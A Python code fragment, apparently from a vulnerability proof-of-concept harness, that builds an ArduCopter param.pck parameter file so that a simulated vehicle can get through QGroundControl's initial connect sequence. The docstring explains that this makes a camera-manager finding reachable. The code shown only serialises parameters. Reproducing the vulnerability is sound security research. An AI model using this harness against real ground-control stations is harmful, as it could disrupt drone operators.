MAGIC_WITHDEFAULTS = 0x671C


def _param_pck_entry(name: bytes, value: float) -> bytes:
    """One param.pck entry, common_len=0 so no prefix compression is implied."""
    name_len = len(name)
    b0 = (0x01 << 4) | AP_PARAM_FLOAT          # flags bit0 = withdefault
    b1 = ((name_len - 1) & 0x0F) << 4          # common_len = 0
    return bytes([b0, b1]) + name + struct.pack("<ff", value, value)


def build_param_pck() -> bytes:
    """A complete, well-formed ArduCopter param.pck.

    QGCCameraManager::_mavlinkMessageReceived() begins with

        if (!_initialConnectComplete) { return; }

    so until QGC finishes its initial connect sequence EVERY camera heartbeat is
    discarded before the compid gate is even reached -- and the parameter download
    is part of that sequence. Serving a real parameter set is therefore a
    prerequisite for this finding to be reachable at all, not dressing.
    """
    defaults = {}
    for line in _COPTER_DEFAULT_PARAMS_TSV.strip().split("\n"):
        parts = line.split()
        if len(parts) >= 2:
            try:
                defaults[parts[0]] = float(parts[1])
            except ValueError:
                pass
    entries = []
    for nm in sorted(defaults):
        nb = nm.encode("ascii", "ignore")
        if 1 <= len(nb) <= 16:
            entries.append(_param_pck_entry(nb, defaults[nm]))
    num = len(entries)
    return struct.pack("<HHH", MAGIC_WITHDEFAULTS, num, num) + b"".join(entries)

